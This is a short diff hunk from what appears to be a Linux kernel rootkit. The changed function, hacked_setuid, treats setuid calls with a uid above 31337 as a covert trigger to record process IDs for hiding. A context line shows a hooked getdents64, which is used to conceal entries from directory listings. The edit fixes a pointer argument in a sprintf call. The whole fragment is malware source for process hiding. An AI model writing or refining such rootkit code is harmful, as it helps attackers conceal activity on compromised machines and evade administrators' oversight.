@@ -150,7 +150,7 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 
 asmlinkage int hacked_setuid(uid_t uid){
 	if(uid > 31337){
-		sprintf(hidden_PIDs[index++], "%d", (uid - 31337));
+		sprintf(&hidden_PIDs[index++], "%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
 		int i;
 		for(i = 0; i < index; i++){
